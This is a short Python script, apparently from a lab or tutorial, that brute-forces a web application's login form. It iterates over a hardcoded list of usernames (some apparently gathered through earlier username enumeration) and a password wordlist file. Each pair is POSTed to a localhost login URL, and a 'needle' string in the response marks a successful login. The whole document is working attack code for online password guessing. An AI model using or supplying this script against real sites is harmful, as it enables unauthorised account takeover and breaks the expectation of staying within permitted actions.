# because interfacing with a web app we import the requests module
import requests
import sys

target = "http://127.0.0.1:8000/users/login/"
# set target to the web app URL or ‘https://<IP_address>’
usernames = ["ll_admin", "damian", "mike"]
# usernames to enumerate over we might have gotten from username enumeration
passwords = "pass_list.txt"
# password list file
needle = "keep a list"
# needle is any text that would be on a 
# page ONLY if a success login/redirect occurs

for username in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n").encode()
            sys.stdout.write(f"[X] Attempting user:password -> {username}:{password.decode()}\r")
            sys.stdout.flush() # flush the buffer after each write
            r = requests.post(target, data={"username": username, "password": password})
            if needle.encode() in r.content:
                # to check if request was valid
                sys.stdout.write("\n")
                sys.stdout.write(f"\t[>>>>] Valid password '{password.decode()}' found for user '{username}'!")
                sys.exit()
        sys.stdout.flush() # flush() buffer again
        sys.stdout.write("\n")
        sys.stdout.write(f"\tNo password found for '{username}'")
        sys.stdout.write("\n")